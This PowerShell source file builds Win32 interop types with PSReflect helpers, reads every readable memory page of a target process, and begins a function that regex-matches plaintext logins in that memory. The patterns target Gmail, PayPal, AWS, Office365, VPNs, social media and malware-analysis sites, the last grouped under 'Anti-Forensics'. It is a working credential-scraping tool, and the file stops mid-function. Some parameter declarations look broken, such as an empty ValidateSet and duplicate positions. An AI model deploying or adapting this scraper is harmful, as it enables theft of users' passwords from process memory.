#region depends
#Author: Matthew Graeber (@mattifestation)
#License: BSD 3-Clause

#region PSReflect definitions
function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func
 
.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            
            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field
 
.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}
#endregion

function Get-MemoryContent {
    [OutputType('MEMUTIL.MEMORY_PAGE')]
    Param (
        [Parameter(Mandatory = $True)]
        [IntPtr]
        $ProcessHandle,

        [Switch]
        $IncludeImagePages
    )

    #region PSReflect signatures
    $Mod = New-InMemoryModule -ModuleName MemUtils

    $ProcessorType = psenum $Mod SYSINFO.PROCESSOR_ARCH UInt16 @{
        PROCESSOR_ARCHITECTURE_INTEL =   0
        PROCESSOR_ARCHITECTURE_MIPS =    1
        PROCESSOR_ARCHITECTURE_ALPHA =   2
        PROCESSOR_ARCHITECTURE_PPC =     3
        PROCESSOR_ARCHITECTURE_SHX =     4
        PROCESSOR_ARCHITECTURE_ARM =     5
        PROCESSOR_ARCHITECTURE_IA64 =    6
        PROCESSOR_ARCHITECTURE_ALPHA64 = 7
        PROCESSOR_ARCHITECTURE_AMD64 =   9
    }

    $SYSTEM_INFO = struct $Mod SYSINFO.SYSTEM_INFO @{
        ProcessorArchitecture = field 0 $ProcessorType
        Reserved = field 1 Int16
        PageSize = field 2 Int32
        MinimumApplicationAddress = field 3 IntPtr
        MaximumApplicationAddress = field 4 IntPtr
        ActiveProcessorMask = field 5 IntPtr
        NumberOfProcessors = field 6 Int32
        ProcessorType = field 7 Int32
        AllocationGranularity = field 8 Int32
        ProcessorLevel = field 9 Int16
        ProcessorRevision = field 10 Int16
    }

    # "This member can be one of the memory protection constants
    #  or 0 if the caller does not have access."
    # i.e. not bitfield
    $MemProtection = psenum $Mod MEMUTIL.MEM_PROTECT Int32 @{
        PAGE_EXECUTE =           0x00000010
        PAGE_EXECUTE_READ =      0x00000020
        PAGE_EXECUTE_READWRITE = 0x00000040
        PAGE_EXECUTE_WRITECOPY = 0x00000080
        PAGE_NOACCESS =          0x00000001
        PAGE_READONLY =          0x00000002
        PAGE_READWRITE =         0x00000004
        PAGE_WRITECOPY =         0x00000008
        PAGE_GUARD =             0x00000100
        PAGE_NOCACHE =           0x00000200
        PAGE_WRITECOMBINE =      0x00000400
    }

    # These enums aren't necessary. They simply help deciphering
    # values for debugging purposes.

    # "This member can be one of the following values."
    # i.e. not bitfield
    $MemState = psenum $Mod MEMUTIL.MEM_STATE Int32 @{
        MEM_COMMIT =  0x00001000
        MEM_FREE =    0x00010000
        MEM_RESERVE = 0x00002000
    }

    $MemType = psenum $Mod MEMUTIL.MEM_TYPE Int32 @{
        MEM_IMAGE =   0x01000000
        MEM_MAPPED =  0x00040000
        MEM_PRIVATE = 0x00020000
    }

    # After testing, an 8-byte packing size works on both 32 and 64-bit
    $MEMORY_BASIC_INFORMATION = struct $Mod MEMUTIL.MEMORY_BASIC_INFORMATION @{
        BaseAddress = field 0 IntPtr
        AllocationBase = field 1 IntPtr
        AllocationProtect = field 2 $MemProtection
        RegionSize = field 3 IntPtr
        State = field 4 $MemState
        Protect = field 5 $MemProtection
        Type = field 6 $MemType
    } -PackingSize Size8

    $FunctionDefinitions = @(
        (func kernel32 GetSystemInfo ([Void]) @(
            $SYSTEM_INFO.MakeByRefType()               # _Out_ LPSYSTEM_INFO lpSystemInfo
        )),
        (func kernel32 VirtualQueryEx ([Int32]) @(
            [IntPtr],                                  # _In_ HANDLE hProcess
            [IntPtr],                                  # _In_opt_ LPCVOID lpAddress
            $MEMORY_BASIC_INFORMATION.MakeByRefType(), # _Out_ PMEMORY_BASIC_INFORMATION lpBuffer
            [Int]                                      # _In_ SIZE_T dwLength 
                                                       # Technically, I should have used IntPtr since 
                                                       # SIZE_T is of size pointer. It really doesn't
                                                       # matter in this case though.
        ) -SetLastError), # MSDN states to call GetLastError if the return value is zero.
        (func kernel32 ReadProcessMemory ([Bool]) @(
            [IntPtr],                                  # _In_ HANDLE hProcess
            [IntPtr],                                  # _In_ LPCVOID lpBaseAddress
            [Byte[]],                                  # _Out_ LPVOID  lpBuffer
            [IntPtr],                                  # _In_ SIZE_T nSize
            [Int].MakeByRefType()                      # _Out_ SIZE_T *lpNumberOfBytesRead
        ) -SetLastError) # MSDN states to call GetLastError if the return value is false.
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32MemUtils'
    $Kernel32 = $Types['kernel32']
    #endregion

    #region Helper functions
    function Get-SystemInformation {
        [OutputType('SYSINFO.SYSTEM_INFO')]
        Param ()

        $SysInfo = [Activator]::CreateInstance($SYSTEM_INFO)
        $Kernel32::GetSystemInfo([Ref] $SysInfo)

        $SysInfo
    }

    # Should be treated as a helper function. Users should not have to specify a valid address.
    # Also, functions that rely upon this should handle the closing of handles.
    function Get-VirtualMemoryInformation {
        [OutputType('MEMUTIL.MEMORY_BASIC_INFORMATION')]
        Param (
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Alias('Handle')]
            [IntPtr]
            [ValidateScript({ $_ -ne [IntPtr]::Zero })]
            $ProcessHandle,

            [Parameter(Mandatory = $True)]
            [IntPtr]
            $VirtualAddress
        )

        $MemoryInfo = [Activator]::CreateInstance($MEMORY_BASIC_INFORMATION)

        $MemInfoStructSize = $MEMORY_BASIC_INFORMATION::GetSize()

        $BytesRead = $Kernel32::VirtualQueryEx($ProcessHandle,
            $VirtualAddress,
            [Ref] $MemoryInfo,
            $MemInfoStructSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if (-not $BytesRead) {
            $Exception = [ComponentModel.Win32Exception] $LastError

            throw "VirtualQueryEx failed for address 0x$($VirtualAddress.ToString("X$([IntPtr]::Size * 2)")). Error code: 0x$($LastError.ToString('X8')), Error message: $($Exception.Message)"
        }

        if ($BytesRead -ne $MemInfoStructSize) {
            Write-Warning "Full virtual memory information was not read for address: 0x$($VirtualAddress.ToString("X$([IntPtr]::Size * 2)"))"
        }

        $MemoryInfo
    }

    function Get-ProcessVirtualMemoryInformation {
        [OutputType('MEMUTIL.MEMORY_BASIC_INFORMATION')]
        Param (
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Alias('Handle')]
            [IntPtr]
            [ValidateScript({ $_ -ne [IntPtr]::Zero })]
            $ProcessHandle
        )

        # Used to determine the minimum and maximum user-mode address range.
        # Many RAM scrapers just assume the user-mode range.
        # Also, if you wanted to just brute-force this address range rather
        # than using VirtualQuery, you could just increment addresses by the reported
        # page size (typically 0x1000).
        $SysInfo = Get-SystemInformation

        $Arguments = @{
            Handle = $ProcessHandle
            VirtualAddress = $SysInfo.MinimumApplicationAddress
        }

        $MemoryInfo = Get-VirtualMemoryInformation @Arguments

        # Point to the next memory region
        $NextRegion = [IntPtr] ($MemoryInfo.BaseAddress.ToInt64() + $MemoryInfo.RegionSize.ToInt64())

        # Output the first valid memory page info
        $MemoryInfo

        # Output all page info until MaximumApplicationAddress is reached
        while ($NextRegion.ToInt64() -lt $SysInfo.MaximumApplicationAddress.ToInt64()) {
            $Arguments = @{
                Handle = $ProcessHandle
                VirtualAddress = $NextRegion
            }

            $MemoryInfo = Get-VirtualMemoryInformation @Arguments

            $MemoryInfo

            $NextRegion = [IntPtr] ($MemoryInfo.BaseAddress.ToInt64() + $MemoryInfo.RegionSize.ToInt64())
        }
    }
    #endregion
    
    # e.g. you're not running PS elevated for a privileged process
    if (-not $ProcessHandle) {
        throw "Unable to obtain process handle for process ID: $Id"
    }

    <# Only read from the following memory pages:
        1) Those that are committed
        2) Those with read access
        3) Non guard pages. This would avoid triggering potential exception unneccesarily.
        4) Optional: Do not read PE images loaded via traditional means unless requested with -IncludeImagePages
    #>
    Get-ProcessVirtualMemoryInformation -ProcessHandle $ProcessHandle | Where-Object {
        (($_.State -band $MemState::MEM_COMMIT) -eq $MemState::MEM_COMMIT) -and
        ((($_.Protect -band $MemProtection::PAGE_READWRITE) -eq $MemProtection::PAGE_READWRITE) -or
        (($_.Protect -band $MemProtection::PAGE_READONLY) -eq $MemProtection::PAGE_READONLY)) -and
        (($_.Protect -band $MemProtection::PAGE_GUARD) -ne $MemProtection::PAGE_GUARD)
    } | ForEach-Object {
        if ($IncludeImagePages -or
        (-not $IncludeImagePages -and $_.Type -ne $MemType::MEM_IMAGE)) {
            $Bytes = New-Object Byte[]($_.RegionSize.ToInt64())

            $BytesRead = 0
            $Result = $Kernel32::ReadProcessMemory(
                $ProcessHandle,
                $_.BaseAddress,
                $Bytes,
                $_.RegionSize,
                [Ref] $BytesRead);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
            if (-not $Result) {
                $Exception = [ComponentModel.Win32Exception] $LastError

                Write-Error "ReadProcessMemory failed for address 0x$($_.BaseAddress.ToString("X$([IntPtr]::Size * 2)")). Error code: 0x$($LastError.ToString('X8')), Error message: $($Exception.Message)"
            }

            $Properties = @{
                BaseAddress = $_.BaseAddress
                Content = $Bytes
                AllocationInfo = $_
            }

            $MemoryPageContent = New-Object -TypeName PSObject -Property $Properties
            $MemoryPageContent.PSObject.TypeNames.Insert(0, 'MEMUTIL.MEMORY_PAGE')
            $MemoryPageContent
        }
    }
}
#endregion depends

function Find-MemoryMatch {
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [Diagnostics.Process[]]
        $Process,

        [Parameter(Mandatory = $true, Position = 1)]
        [Regex[]]
        $Regex,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet()]
        [Regex[]]
        $Match,

        [Parameter()]
        [Int]
        $ThrottleLimit = 20
    )

    begin {
        
        #region Regexes
        $Regexes = @{}
    
        # Gmail
        $Regexes.Add('Gmail', [regex]'&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie=')

        # Web Services
        $Regexes.Add('Dropbox', [regex]'login_email=.{1,99}&login_password=.{1,99}&')
        $Regexes.Add('Office365', [regex]'login=.{1,32}&passwd=.{1,22}&PPSX=')
        $Regexes.Add('OneDrive', [regex]'login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT=')
        $Regexes.Add('PayPal', [regex]'login_email=.{1,48}&login_password=.{1,16}&submit=Log\+In&browser_name')
        $Regexes.Add('AWS', [regex]'&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=')
        $Regexes.Add('OWA', [regex]'&username=.{1,48}&password=.{1,48}&passwordText')
        $Regexes.Add('Slack', [regex]'&crumb=.{1,70}&email=.{1,50}&password=.{1,48}')
        $Regexes.Add('CitrixOnline', [regex]'emailAddress=.{1,50}&password=.{1,50}&submit')

        # Accounting
        $Regexes.Add('Xerox', [regex]'fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken=')
        $Regexes.Add('MYOB', [regex]'UserName=.{1,50}&Password=.{1,50}&RememberMe=')

        # SSL VPN's
        $Regexes.Add('JuniperSSLVPN', [regex]'tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit=')

        # Social Media
        $Regexes.Add('Twitter', [regex]'username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me=')
        $Regexes.Add('Facebook', [regex]'lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&default_persistent=')
        $Regexes.Add('LinkedIn', [regex]'session_key=.{1,50}&session_password=.{1,50}&isJsEnabled')

        # Anti-Forensics
        $Regexes.Add('Malwr', [regex]'&username=.{1,32}&password=.{1,22}&next=')
        $Regexes.Add('VirusTotal', [regex]'password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json')
        $Regexes.Add('AnubisLabs', [regex]'username=.{1,42}&password=.{1,22}&login=login')

        # Remote Access
        $Regexes.Add('CitrixNetScaler', [regex]'login=.{1,22}&passwd=.{1,42}')
        $Regexes.Add('RDPWeb', [regex]'DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType')
    
        # Dev Related
